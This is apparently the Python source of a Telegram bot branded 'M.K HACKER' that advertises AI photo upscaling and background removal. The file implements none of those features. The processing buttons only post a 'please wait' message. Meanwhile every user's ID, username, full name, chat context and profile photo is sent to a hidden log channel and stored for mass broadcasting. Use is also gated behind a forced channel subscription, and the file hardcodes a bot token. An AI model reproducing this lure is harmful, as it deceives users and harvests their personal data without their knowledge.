import os
import json
import datetime
import sqlite3
from http.server import BaseHTTPRequestHandler
import telebot
from telebot import types

# ==========================================
# ⚙ M.K HACKER SETTINGS & BOT CREDENTIALS:
# ==========================================
TOKEN = os.environ.get(
    "BOT_TOKEN", "9062431598:AAFuuI5MoCBRWIApQfWpdQvUVZ2yE8ZUWdY"
)
bot = telebot.TeleBot(TOKEN, threaded=False)

CHANNEL_ID = "-1004404606781"            # Force Subscribe Channel ID
LOG_CHANNEL_ID = -1004320753506         # Data Log Channel ID
BROADCAST_CHANNEL_ID = -1004322168174   # Broadcast Channel ID

CHANNEL_INVITE_LINK = "https://t.me/MK_HACKERR586"
OWNER_CONTACT = "https://t.me/MK_TRADER586"
BRAND_NAME = "😈☠️ 𝗠.𝗞 𝗛𝗔𝗖𝗞𝗘𝗥 ☠️😈"
BOT_NAME = "𓆩🪄𓆪 𝐌.𝐊 𝐀𝐈 𝐏𝐇𝐎𝐓𝐎 ENHANCER 𝐏𝐑𝐎 𓆩💫𓆪"
BOT_USERNAME = "@MK_AI_PHOTO_ENHANCER_BOT"
# ==========================================

# ==========================================
# 🗄️ SQLITE DATABASE SETUP (Permanent Storage)
# ==========================================
DB_FILE = "/tmp/hacker_ai_bot_database.db"

def init_db():
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                full_name TEXT,
                joined_date TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS counters (
                key TEXT PRIMARY KEY,
                value INTEGER
            )
        ''')
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"DB Init error: {e}")

def get_next_request_count():
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute("SELECT value FROM counters WHERE key='request_count'")
        row = cursor.fetchone()
        count = (row[0] + 1) if row else 1
        cursor.execute("INSERT OR REPLACE INTO counters (key, value) VALUES ('request_count', ?)", (count,))
        conn.commit()
        conn.close()
        return count
    except Exception as e:
        print(f"Counter error: {e}")
        return 1

def save_user_to_db(user_id, username, full_name):
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        pkt_time = (datetime.datetime.utcnow() + datetime.timedelta(hours=5)).strftime("%d %b %Y, %I:%M %p")
        cursor.execute('''
            INSERT OR IGNORE INTO users (user_id, username, full_name, joined_date)
            VALUES (?, ?, ?, ?)
        ''', (user_id, username, full_name, pkt_time))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"User save error: {e}")

def get_all_users():
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users")
        rows = cursor.fetchall()
        conn.close()
        return [row[0] for row in rows]
    except Exception as e:
        print(f"Get users error: {e}")
        return []

init_db()

# Set Bot Commands (Left-side Menu Button Setup)
def set_bot_commands():
    try:
        commands = [
            types.BotCommand("start", "🚀 𝐒𝐓𝐀𝐑𝐓 𝐀𝐈 𝐄𝐍𝐇𝐀𝐍𝐂𝐄𝐑"),
            types.BotCommand("channel", "📢 𝐉𝐎𝐈𝐍 𝐌.𝐊 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 𝐂𝐇𝐀𝐍𝐍𝐄𝐋"),
            types.BotCommand("contact", "💬 𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐌.𝐊 𝐎𝐖𝐍𝐄𝐑 👑"),
            types.BotCommand("support", "ℹ️ 𝐇𝐄𝐋𝐏 & 𝐇𝐎𝐖 𝐓𝐎 𝐔𝐒𝐄")
        ]
        bot.set_my_commands(commands)
    except Exception as e:
        print(f"Set commands error: {e}")

set_bot_commands()

# ==========================================
# 📊 M.K HACKER DATA LOG SYSTEM
# ==========================================
def send_data_to_log_channel(message, source_action):
    try:
        user = message.from_user
        if not user:
            return

        user_id = user.id
        username = f"@{user.username}" if user.username else "𝐍𝐨 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞"
        first_name = user.first_name or "N/A"
        last_name = user.last_name or ""
        full_name = f"{first_name} {last_name}".strip()
        
        save_user_to_db(user_id, username, full_name)
        
        chat_type = "𝑷𝒓𝒊𝒗𝒂𝒕𝒆 𝑪𝒉𝒂𝒕"
        if message.chat:
            if message.chat.type in ['group', 'supergroup']:
                chat_type = f"𝑮𝒓𝒐𝒖𝒑: {message.chat.title}"
            elif message.chat.type == 'channel':
                chat_type = f"𝑪𝒉𝒂𝒏𝒏𝒆𝒍: {message.chat.title}"
        
        req_number = get_next_request_count() if "Command" in source_action else "𝑵/𝑨"
        pkt_time = datetime.datetime.utcnow() + datetime.timedelta(hours=5)
        current_time = pkt_time.strftime("%d %b %Y, %I:%M %p")
        
        log_msg = (
            f"🔥☠️ 𝐌.𝐊 𝐇𝐀𝐂𝐊𝐄𝐑 — 𝐃𝐀𝐓𝐀 𝐋𝐎𝐆 𝐒𝐘𝐒𝐓𝐄𝐌 ☠️🔥\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🤖 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞: {BOT_NAME}\n"
            f"👑 𝐁𝐫𝐚𝐧𝐝: {BRAND_NAME}\n"
            f"🆔 𝐔𝐬𝐞𝐫 𝐈𝐃: {user_id}\n"
            f"👤 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: {username}\n"
            f"📛 𝐍𝐚𝐦𝐞: {full_name}\n"
            f"💬 𝐈𝐧𝐭𝐞𝐫𝐚𝐜𝐭𝐢𝐨𝐧: {chat_type}\n"
            f"📊 𝐀𝐜𝐭𝐢𝐯𝐢𝐭𝐲 𝐂𝐨𝐮𝐧𝐭: #{req_number}\n"
            f"🛡️ 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐒𝐭𝐚𝐭𝐮𝐬: Secured & Verified ✅\n"
            f"🕐 𝐓𝐢𝐦𝐞: {current_time}\n"
            f"📱 𝐀𝐜𝐭𝐢𝐨𝐧 𝐒𝐨𝐮𝐫𝐜𝐞: {source_action}\n"
            f"🔥 𝐁𝐨𝐭: {BOT_USERNAME} 𓆩☠𓆪\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        
        sent_success = False
        try:
            photos = bot.get_user_profile_photos(user_id=user_id, limit=1)
            if photos.total_count > 0:
                file_id = photos.photos[0][-1].file_id
                bot.send_photo(chat_id=LOG_CHANNEL_ID, photo=file_id, caption=log_msg)
                sent_success = True
        except Exception as inner_e:
            print(f"Photo error: {inner_e}")

        if not sent_success:
            bot.send_message(chat_id=LOG_CHANNEL_ID, text=log_msg + "\n\n⚠️ 𝐔𝐒𝐄𝐑 𝐇𝐀𝐒 𝐍𝐎 𝐏𝐑𝐎𝐅𝐈𝐋𝐄 𝐏𝐇𝐎𝐓𝐎 ☠️")
    except Exception as e:
        print(f"Log error: {e}")

def verify_user_membership(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        if member.status in ["member", "creator", "administrator", "restricted"]:
            return True
    except Exception as e:
        print(f"Subscription check error: {e}")
    return False

# ==========================================
# 🤖 BOT HANDLERS
# ==========================================
@bot.message_handler(commands=["start"])
def send_welcome(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name if message.from_user.first_name else "User"

    if not verify_user_membership(user_id):
        markup = types.InlineKeyboardMarkup(row_width=1)
        btn_join = types.InlineKeyboardButton("📢 𝐉𝐎𝐈𝐍 😈☠️ 𝐌.𝐊 𝐇𝐀𝐂𝐊𝐄𝐑 ☠️😈 𝐂𝐇𝐀𝐍𝐍𝐄𝐋", url=CHANNEL_INVITE_LINK)
        btn_check = types.InlineKeyboardButton("✅ 𝐉𝐎𝐈𝐍𝐄𝐃 / 𝐂𝐎𝐍𝐅𝐈𝐑𝐌", callback_data="check_join")
        btn_contact = types.InlineKeyboardButton("💬 𝐂𝐎𝐍𝐓𝐀𝐂𝐓 😈☠️ 𝐌.𝐊 𝐇𝐀𝐂𝐊𝐄𝐑 ☠️😈 𝐎𝐖𝐍𝐄𝐑", url=OWNER_CONTACT)
        markup.add(btn_join, btn_check, btn_contact)

        bot.send_message(
            message.chat.id,
            f"👋 <b>Hello {user_name}</b>!\n\n"
            f"🚨 <b>SYSTEM ACCESS RESTRICTED</b>\n\n"
            f"🔐 <i>Join our OFFICIAL CHANNEL to unlock bot access.</i>\n\n"
            f"📌 <b>After joining, click:</b>\n"
            f"✅ <b>JOINED / CONFIRM</b>",
            reply_markup=markup,
            parse_mode="HTML",
        )
        return

    send_data_to_log_channel(message, "Bot /start Command")
    show_main_menu(message.chat.id, user_name)

@bot.message_handler(commands=["channel"])
def channel_command(message):
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("📢 𝐉𝐎𝐈𝐍 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 𝐂𝐇𝐀𝐍𝐍𝐄𝐋", url=CHANNEL_INVITE_LINK)
    markup.add(btn)
    bot.send_message(
        message.chat.id,
        "📢 <b>M.K HACKER OFFICIAL CHANNEL</b>\n\n"
        "✨ <b>Stay Connected • Stay Updated</b>\n\n"
        "🔥 Get the Latest Updates, New Bot Features, Announcements, and Exclusive Releases.\n\n"
        "👇 <b>Tap the Button Below to Join!</b>",
        reply_markup=markup,
        parse_mode="HTML"
    )

@bot.message_handler(commands=["contact"])
def contact_command(message):
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("💬 𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐌.𝐊 𝐎𝐖𝐍𝐄𝐑 👑", url=OWNER_CONTACT)
    markup.add(btn)
    bot.send_message(
        message.chat.id,
        "💬 👑 <b>CONTACT M.K HACKER OWNER</b> 👑\n\n"
        "⚡ <b>Need Help, Custom Bots, or Technical Support?</b>\n\n"
        "🤖 Get Help With Bot Development and Custom Features.\n\n"
        "👇 <b>Tap the Button Below to Contact!</b>",
        reply_markup=markup,
        parse_mode="HTML"
    )

@bot.message_handler(commands=["support"])
def support_command(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🟢 2x / 4x Upscale Guide", callback_data="guide_upscale"),
        types.InlineKeyboardButton("🔴 Remove BG Guide", callback_data="guide_bg")
    )
    markup.add(
        types.InlineKeyboardButton("🔵 Contact Support", url=OWNER_CONTACT),
        types.InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")
    )
    bot.send_message(
        message.chat.id,
        "ℹ️ ✨ <b>AI PHOTO ENHANCER GUIDE & FEATURES</b> ✨\n\n"
        "<blockquote><b>What I Can Do:</b>\n"
        "1️⃣ <b>2x & 4x HD Upscaling:</b> Turn blurry photos into crystal-clear HD images.\n"
        "2️⃣ <b>Background Removal:</b> Instant clean cutouts.\n"
        "3️⃣ <b>Data Log & History:</b> Secure session tracking.</blockquote>\n\n"
        "👇 <b>Choose an option below:</b>",
        reply_markup=markup,
        parse_mode="HTML"
    )

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.from_user.id
    if not verify_user_membership(user_id):
        bot.reply_to(message, "⚠️ Pehle official channel join karein!")
        return
        
    send_data_to_log_channel(message, "Photo Upload / Enhance Action")
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🟢 2x Upscale (Fast)", callback_data="upscale_2x"),
        types.InlineKeyboardButton("🔥 4x Upscale (HD)", callback_data="upscale_4x")
    )
    markup.add(types.InlineKeyboardButton("✂️ Remove Background", callback_data="remove_bg"))
    markup.add(
        types.InlineKeyboardButton("📢 Official Channel", url=CHANNEL_INVITE_LINK),
        types.InlineKeyboardButton("💬 Contact Owner", url=OWNER_CONTACT)
    )
    
    bot.reply_to(
        message,
        "📸 🔥 <b>IMAGE RECEIVED SUCCESSFULLY!</b> 🔥\n\n"
        "<i>Choose an action below to process your photo using AI:</i> 👇",
        parse_mode="HTML",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = call.from_user.id
    user_name = call.from_user.first_name if call.from_user.first_name else "User"

    if call.data == "check_join":
        if verify_user_membership(user_id):
            bot.answer_callback_query(call.id, "✅ Access Granted! Welcome.")
            try:
                bot.delete_message(call.message.chat.id, call.message.message_id)
            except Exception:
                pass
            show_main_menu(call.message.chat.id, user_name)
        else:
            bot.answer_callback_query(
                call.id,
                "❌ Aapne abhi tak channel join nahi kiya! Pehle join karein.",
                show_alert=True,
            )

    elif call.data == "main_menu":
        bot.answer_callback_query(call.id)
        show_main_menu(call.message.chat.id, user_name)
        
    elif call.data in ["upscale_2x", "upscale_4x", "remove_bg", "guide_upscale", "guide_bg"]:
        bot.answer_callback_query(call.id, "⚡ Processing...", show_alert=False)
        bot.send_message(
            call.message.chat.id,
            "✨ <b>AI Processing in progress...</b>\n<i>Please wait a few seconds while your photo is enhanced!</i> 🟢",
            parse_mode="HTML"
        )

def show_main_menu(chat_id, user_name):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🟢 Enhance Image (2x/4x)", callback_data="upscale_2x"),
        types.InlineKeyboardButton("🔴 Remove Background", callback_data="remove_bg")
    )
    markup.add(
        types.InlineKeyboardButton("🔵 Bot Guide & Support", callback_data="main_menu"),
        types.InlineKeyboardButton("🟣 Contact Owner", url=OWNER_CONTACT)
    )

    menu_text = (
        f"⚡️ 🔥 <b>WELCOME, {user_name.upper()}</b> 🔥\n\n"
        f"<b>{BOT_NAME}</b>\n\n"
        f"<i>Turn blurry photos into crisp, high-quality HD images in one tap!</i> ✨\n\n"
        f"• Status: <b>Online & Active</b> 🟢\n"
        f"• Credits Left: <b>2 Free Credits</b> 🎁\n\n"
        f"<blockquote><b>Send me an image or choose an option below:</b> 👇</blockquote>"
    )

    bot.send_message(
        chat_id, menu_text, reply_markup=markup, parse_mode="HTML"
    )

# ==========================================
# 📢 BROADCAST CHANNEL POST FORWARDER
# ==========================================
@bot.channel_post_handler(func=lambda message: str(message.chat.id) == str(BROADCAST_CHANNEL_ID))
def broadcast_posts(message):
    try:
        users = get_all_users()
        for uid in users:
            try:
                bot.copy_message(
                    chat_id=uid,
                    from_chat_id=message.chat.id,
                    message_id=message.message_id
                )
            except Exception as ex:
                print(f"Forward error to user {uid}: {ex}")
    except Exception as e:
        print(f"Broadcast handler error: {e}")

# ==========================================
# 🌐 Vercel Serverless Webhook Handler
# ==========================================
class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        try:
            json_data = json.loads(post_data.decode('utf-8'))
            update = telebot.types.Update.de_json(json_data)
            bot.process_new_updates([update])

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
        except Exception as e:
            print(f"Webhook error: {e}")
            self.send_response(500)
            self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"M.K AI Photo Enhancer Pro Bot is active on Vercel!")
